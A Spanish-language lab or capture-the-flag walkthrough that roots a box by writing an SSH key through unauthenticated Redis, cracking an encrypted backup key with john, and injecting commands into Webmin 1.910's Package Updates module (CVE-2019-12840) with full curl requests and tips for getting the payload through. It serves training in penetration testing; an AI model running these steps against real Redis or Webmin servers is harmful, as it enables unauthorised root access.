// 01

Resumen

Resumen. Redis escucha sin contraseña y corre como el usuario redis, así que se puede usar CONFIG SET dir/dbfilename + SAVE para escribir un fichero arbitrario. Se escribe una clave SSH pública en /var/lib/redis/.ssh/authorized_keys y se entra como redis. En /opt/id_rsa.bak hay una clave privada de Matt cifrada; con ssh2john + john sale computer2008, que además es la contraseña del sistema de Matt (el SSH directo está bloqueado con DenyUsers Matt, pero su funciona). Esa misma credencial abre Webmin 1.910 (que corre como root) y su módulo *Package Updates* es vulnerable a CVE-2019-12840 → comandos como root.

// 02

Reconocimiento

Lo que se pretende hacer: ver qué servicios hay.

El comando exacto:

SHELL
$ sudo nmap -sS -p- -n -Pn --min-rate 2500 --open 10.129.8.250
$ sudo nmap -sV -p22,80,6379,10000 10.129.8.250
$ redis-cli -h 10.129.8.250 info server | head -5

Lo que se encontró:

22/tcp open ssh OpenSSH 7.6p1 Ubuntu
80/tcp open http Apache httpd 2.4.29 (web en construcción, sin nada útil)
6379/tcp open redis Redis key-value store 4.0.9
10000/tcp open http MiniServ 1.910 (Webmin httpd)

La web del 80 no tiene nada (gobuster solo devuelve images, upload, css, js, fonts). El interés está en Redis y en Webmin.

// 03

Redis sin auth: escribir una clave SSH

Lo que se pretende hacer: aprovechar que Redis puede escribir ficheros para colarnos en el sistema.

El comando exacto:

SHELL
$ ssh-keygen -t rsa -b 2048 -f id_rsa_pm -N ''
$ (echo -e "\n\n"; cat id_rsa_pm.pub; echo -e "\n\n") > spaced.txt
 
$ redis-cli -h 10.129.8.250 config get dir # -> /var/lib/redis
$ redis-cli -h 10.129.8.250 -x set pwn < spaced.txt
$ redis-cli -h 10.129.8.250 config set dir /var/lib/redis/.ssh
$ redis-cli -h 10.129.8.250 config set dbfilename authorized_keys
$ redis-cli -h 10.129.8.250 save
 
$ ssh -i id_rsa_pm redis@10.129.8.250

Lo que se encontró: shell como redis (uid=107).

Por qué funciona: Redis escribe su base de datos en el fichero que le digas, y sshd lee authorized_keys línea a línea ignorando la basura del formato de Redis. Los saltos de línea extra aseguran que la clave quede en su propia línea.

// 04

La clave de Matt y john

Lo que se pretende hacer: encontrar credenciales de otro usuario.

El comando exacto:

SHELL
$ ls -l /opt # -rwxr-xr-x 1 Matt Matt id_rsa.bak
$ cat /opt/id_rsa.bak # clave privada RSA *cifrada* (Proc-Type: 4,ENCRYPTED)
 
$ ssh2john /opt/id_rsa.bak > id_rsa.john
$ john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt

Lo que se encontró: la contraseña de la clave es computer2008.

// 05

su Matt

Lo que se pretende hacer: entrar como Matt, aunque sshd lo prohíbe.

El comando exacto:

SHELL
$ grep -i deny /etc/ssh/sshd_config # DenyUsers Matt
$ su Matt # password: computer2008
$ cat /home/Matt/user.txt

Lo que se encontró: [flag oculta] (user flag). Matt reutiliza la contraseña de su clave SSH como contraseña del sistema.

// 06

Webmin 1.910 → CVE-2019-12840 → root

Lo que se pretende hacer: escalar a root con el gestor que corre como root.

Los pasos:

1. Entrar en https://10.129.8.250:10000 con Matt:computer2008 (Webmin usa la autenticación del sistema). Matt solo tiene el módulo Package Updates. 2. Ese módulo concatena el parámetro u en un comando apt-get -y install …, así que se inyecta con |. 3. Hay que mandar dos parámetros u y la cabecera Referer.

El comando exacto:

SHELL
$ IP=10.129.8.250
# 1) visita inicial (Webmin exige cookie) y login
$ curl -sk -c webmin.cookies -b 'testing=1' \
$ -d 'page=' -d 'user=Matt' -d 'pass=computer2008' \
$ https://$IP:10000/session_login.cgi -o /dev/null
 
# 2) inyección en el modulo Package Updates
$ curl -sk -b webmin.cookies -b 'testing=1' -H "Referer: https://$IP:10000/" \
$ --data-urlencode 'u=acl/apt' \
$ --data-urlencode 'u= |bash -c "cd;cat root.txt"' \
$ --data-urlencode 'ok_top=Update Selected Packages' \
$ https://$IP:10000/package-updates/update.cgi | grep -o '<pre>[^<]*'

Lo que se encontró: el <pre> de la respuesta trae la salida del comando:

[flag oculta]

Trampas de esta parte (importantes):

- Sin el GET inicial, session_login.cgi responde 500 Error - No cookies. - El parámetro u tiene formato paquete/versión: el módulo corta el valor en la primera /. Por eso u= | cp /root/root.txt /tmp/x se ejecuta solo como cp (sin argumentos). La solución es un payload sin barras: |bash -c "cd;cat root.txt" (cd va a /root y allí está root.txt). - Hay que enviar dos valores de u (por eso --data-urlencode repetido; con -d normal solo se manda el último). - Sin la cabecera Referer Webmin responde con un aviso de "unknown URL" y no ejecuta.
